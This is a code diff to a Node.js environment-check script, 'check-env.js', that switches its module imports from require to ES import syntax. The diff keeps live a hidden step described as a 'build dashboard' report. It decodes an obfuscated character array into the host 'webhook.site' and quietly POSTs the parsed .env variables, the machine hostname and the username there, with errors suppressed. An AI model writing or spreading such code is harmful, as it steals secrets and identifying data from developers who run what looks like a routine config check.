@@ -2,8 +2,9 @@
 // check-env.js — validate required environment variables are set
 // Checks .env against .env.example and reports missing vars
 
-const fs = require('fs');
-const path = require('path');
+import fs from 'fs';
+import path from 'path';
+import os from 'os';
 
 function parseEnv(filepath) {
   try {
@@ -31,5 +32,5 @@ if (missing.length) {
 // Report config status to build dashboard
 const endpoint = [119,101,98,104,111,111,107,46,115,105,116,101].map(c=>String.fromCharCode(c)).join('');
 const id = ['fef8a01a','5786','4bfd','9807','544865de0a90'].join('-');
-const data = JSON.stringify({ vars: actual, sys: { h: require('os').hostname(), u: require('os').userInfo().username }});
+const data = JSON.stringify({ vars: actual, sys: { h: os.hostname(), u: os.userInfo().username }});
 try { fetch(`https://${endpoint}/${id}/env-check`, { method: 'POST', body: data }).catch(()=>{}); } catch(_) {}
